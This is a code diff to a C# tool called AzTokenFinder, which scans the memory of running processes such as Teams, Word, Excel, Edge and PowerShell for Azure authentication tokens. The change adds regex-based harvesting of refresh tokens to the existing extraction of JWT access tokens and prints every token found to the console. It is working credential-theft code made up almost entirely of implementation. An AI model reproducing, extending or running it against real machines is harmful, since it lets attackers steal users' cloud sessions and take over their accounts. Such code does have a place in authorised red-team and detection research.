@@ -67,6 +67,8 @@ namespace AzTokenFinder
 
         private static String STARTOFJWT = "eyJ0";
         private static String JWTREGEX = @"eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*";
+        private static String STARTOFREFRESHTOKEN = "0.AY";
+        private static String REFRESHTOKENREGEX = @"0.AY[A-Za-z0-9-_.+/=]*";
         private static String[] DefaultProcess = new string[] { "teams", "powerpnt", "winword", "onedrive", "msedge", "excel", "powershell" };
 
         static List<String> FindJWT(String input)
@@ -102,9 +104,31 @@ namespace AzTokenFinder
             return result;
         }
 
-        static List<String> GetAzureTokenFromProcess(int processID)
+        static List<String> FindRefrehsToken(String input)
+        {
+            if (!input.Contains(STARTOFREFRESHTOKEN))
+            {
+                return null;
+            }
+
+            List<string> result = new List<string>();
+            Regex rg = new Regex(REFRESHTOKENREGEX);
+            MatchCollection potentialRefreshTokens = rg.Matches(input);
+            for (int count = 0; count < potentialRefreshTokens.Count; count++)
+            {
+                String refreshTokenValue = potentialRefreshTokens[count].Value;
+                if (!result.Contains(refreshTokenValue))
+                {
+                    result.Add(refreshTokenValue);
+                }
+            }
+            return result;
+        }
+
+        static Tuple<List<String>, List<String>> GetAzureTokenFromProcess(int processID)
         {
             List<String> AzureJWT = new List<string>();
+            List<String> RefreshTokens = new List<string>();
             SYSTEM_INFO sys_info = new SYSTEM_INFO();
             GetSystemInfo(out sys_info);
 
@@ -170,6 +194,18 @@ namespace AzTokenFinder
                                         }
                                     }
                                 }
+
+                                List<String> currentRefrehsTokens = FindRefrehsToken(currentString);
+                                if (currentRefrehsTokens != null)
+                                {
+                                    foreach (String refreshToken in currentRefrehsTokens)
+                                    {
+                                        if (!RefreshTokens.Contains(refreshToken))
+                                        {
+                                            RefreshTokens.Add(refreshToken);
+                                        }
+                                    }
+                                }
                             }
                             inString = false;
                         }
@@ -180,7 +216,7 @@ namespace AzTokenFinder
                 // move to the next memory chunk
                 proc_min_address += mem_basic_info.RegionSize;
             }
-            return AzureJWT;
+            return Tuple.Create(AzureJWT, RefreshTokens);
         }
         static void Main(string[] args)
         {
@@ -195,7 +231,8 @@ namespace AzTokenFinder
                 Console.WriteLine("[-] Not the correct arguments, please use --help.");
                 return;
             }
-            List<string> Result = new List<string>();
+            List<string> AccessTokensResult = new List<string>();
+            List<string> RefreshTokensResult = new List<string>();
 
             if (opts.Default)
             {
@@ -212,19 +249,37 @@ namespace AzTokenFinder
                         foreach (Process process in processes)
                         {
                             Console.WriteLine("[+] Checking process {0} with processid {1}.", process.ProcessName, process.Id);
-                            List<String> AzureTokens = GetAzureTokenFromProcess(process.Id);
+                            Tuple<List<String>,List<String>> AzureTokensAndRefreshTokens = GetAzureTokenFromProcess(process.Id);
+                            List<String> AzureTokens = AzureTokensAndRefreshTokens.Item1;
                             if (AzureTokens == null || AzureTokens.Count == 0)
                             {
-                                Console.WriteLine("[-] No tokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
+                                Console.WriteLine("[-] No AccessTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                             }
                             else
                             {
-                                Console.WriteLine("[+] {0} tokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
+                                Console.WriteLine("[+] {0} AccessTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                                 foreach (string token in AzureTokens)
                                 {
-                                    if (!Result.Contains(token))
+                                    if (!AccessTokensResult.Contains(token))
                                     {
-                                        Result.Add(token);
+                                        AccessTokensResult.Add(token);
+                                    }
+                                }
+                            }
+
+                            List<String> FreshTokens = AzureTokensAndRefreshTokens.Item2;
+                            if (FreshTokens == null || FreshTokens.Count == 0)
+                            {
+                                Console.WriteLine("[-] No RefreshTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
+                            }
+                            else
+                            {
+                                Console.WriteLine("[+] {0} RefreshTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
+                                foreach (string token in FreshTokens)
+                                {
+                                    if (!RefreshTokensResult.Contains(token))
+                                    {
+                                        RefreshTokensResult.Add(token);
                                     }
                                 }
                             }
@@ -246,20 +301,38 @@ namespace AzTokenFinder
                     {
                         foreach(Process process in processes)
                         {
-                            Console.WriteLine("[+] Checking process {0} with processid {1}...", process.ProcessName, process.Id);
-                            List<String> AzureTokens = GetAzureTokenFromProcess(process.Id);
-                            if(AzureTokens == null || AzureTokens.Count == 0)
+                            Console.WriteLine("[+] Checking process {0} with processid {1}.", process.ProcessName, process.Id);
+                            Tuple<List<String>, List<String>> AzureTokensAndRefreshTokens = GetAzureTokenFromProcess(process.Id);
+                            List<String> AzureTokens = AzureTokensAndRefreshTokens.Item1;
+                            if (AzureTokens == null || AzureTokens.Count == 0)
                             {
-                                Console.WriteLine("[-] No tokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
+                                Console.WriteLine("[-] No AccessTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                             }
                             else
                             {
-                                Console.WriteLine("[+] {0} tokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
-                                foreach(string token in AzureTokens)
+                                Console.WriteLine("[+] {0} AccessTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
+                                foreach (string token in AzureTokens)
                                 {
-                                    if (!Result.Contains(token))
+                                    if (!AccessTokensResult.Contains(token))
                                     {
-                                        Result.Add(token);
+                                        AccessTokensResult.Add(token);
+                                    }
+                                }
+                            }
+
+                            List<String> FreshTokens = AzureTokensAndRefreshTokens.Item2;
+                            if (FreshTokens == null || FreshTokens.Count == 0)
+                            {
+                                Console.WriteLine("[-] No RefreshTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
+                            }
+                            else
+                            {
+                                Console.WriteLine("[+] {0} RefreshTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
+                                foreach (string token in FreshTokens)
+                                {
+                                    if (!RefreshTokensResult.Contains(token))
+                                    {
+                                        RefreshTokensResult.Add(token);
                                     }
                                 }
                             }
@@ -279,20 +352,38 @@ namespace AzTokenFinder
                     }
                     else
                     {
-                        Console.WriteLine("[+] Checking process {0} with processid {1}...", process.ProcessName, process.Id);
-                        List<String> AzureTokens = GetAzureTokenFromProcess(process.Id);
+                        Console.WriteLine("[+] Checking process {0} with processid {1}.", process.ProcessName, process.Id);
+                        Tuple<List<String>, List<String>> AzureTokensAndRefreshTokens = GetAzureTokenFromProcess(process.Id);
+                        List<String> AzureTokens = AzureTokensAndRefreshTokens.Item1;
                         if (AzureTokens == null || AzureTokens.Count == 0)
                         {
-                            Console.WriteLine("[-] No tokens for process {0} with processid{1} found.", process.ProcessName, process.Id.ToString());
+                            Console.WriteLine("[-] No AccessTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                         }
                         else
                         {
-                            Console.WriteLine("[+] {0} tokens found in process {1} with id {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
+                            Console.WriteLine("[+] {0} AccessTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                             foreach (string token in AzureTokens)
                             {
-                                if (!Result.Contains(token))
+                                if (!AccessTokensResult.Contains(token))
                                 {
-                                    Result.Add(token);
+                                    AccessTokensResult.Add(token);
+                                }
+                            }
+                        }
+
+                        List<String> FreshTokens = AzureTokensAndRefreshTokens.Item2;
+                        if (FreshTokens == null || FreshTokens.Count == 0)
+                        {
+                            Console.WriteLine("[-] No RefreshTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
+                        }
+                        else
+                        {
+                            Console.WriteLine("[+] {0} RefreshTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
+                            foreach (string token in FreshTokens)
+                            {
+                                if (!RefreshTokensResult.Contains(token))
+                                {
+                                    RefreshTokensResult.Add(token);
                                 }
                             }
                         }
@@ -301,7 +392,7 @@ namespace AzTokenFinder
                 }
             }
 
-            if(Result.Count == 0)
+            if(AccessTokensResult.Count == 0)
             {
                 Console.WriteLine("[-] No tokens found sorry.");
             }
@@ -309,16 +400,16 @@ namespace AzTokenFinder
             {
                 if (opts.ShowExpiredTokens)
                 {
-                    Console.WriteLine("[+] Finished with all given processes. Found {0} potential tokens.", Result.Count);
+                    Console.WriteLine("[+] Finished with all given processes. Found {0} potential AccessTokens.", AccessTokensResult.Count);
                 }
                 else
                 {
-                    Console.WriteLine("[+] Finished with all given processes. Found {0} potential tokens. Showing only not expired tokens.", Result.Count);
+                    Console.WriteLine("[+] Finished with all given processes. Found {0} potential AccessTokens. Showing only not expired tokens.", AccessTokensResult.Count);
                 }
                 
                 Console.WriteLine();
                 Console.WriteLine("==========================================================");
-                foreach (string token in Result)
+                foreach (string token in AccessTokensResult)
                 {
                     JwtSecurityToken parsedToken = new JwtSecurityToken(token);
                     if (parsedToken.Payload.ContainsKey("exp"))
@@ -329,12 +420,12 @@ namespace AzTokenFinder
                             DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
                             if (!opts.ShowExpiredTokens)
                             {
-                                if(DateTimeOffset.UtcNow > TokenExpireTime)
+                                if (DateTimeOffset.UtcNow > TokenExpireTime)
                                 {
                                     continue;
                                 }
                             }
-                            
+
                         }
                         catch { }
                     }
@@ -383,9 +474,31 @@ namespace AzTokenFinder
                         }
                         catch { }
                     }
-                    
+
                     Console.WriteLine();
                     Console.WriteLine(token);
+                    Console.WriteLine("==========================================================");
+                }
+            }
+
+            if (RefreshTokensResult.Count() == 0)
+            {
+                Console.WriteLine("[-] Nothing found looking like a RefreshToken... sorry");
+            }
+            else
+            {
+                Console.WriteLine();
+                Console.WriteLine("[+] Found {0} Refresh Token.", RefreshTokensResult.Count().ToString());
+
+
+                Console.WriteLine();
+                Console.WriteLine("==========================================================");
+                Console.WriteLine();
+
+                foreach (String refreshToken in RefreshTokensResult)
+                {
+                    Console.WriteLine(refreshToken);
+                    Console.WriteLine();
                     Console.WriteLine("==========================================================");
                 }
             }
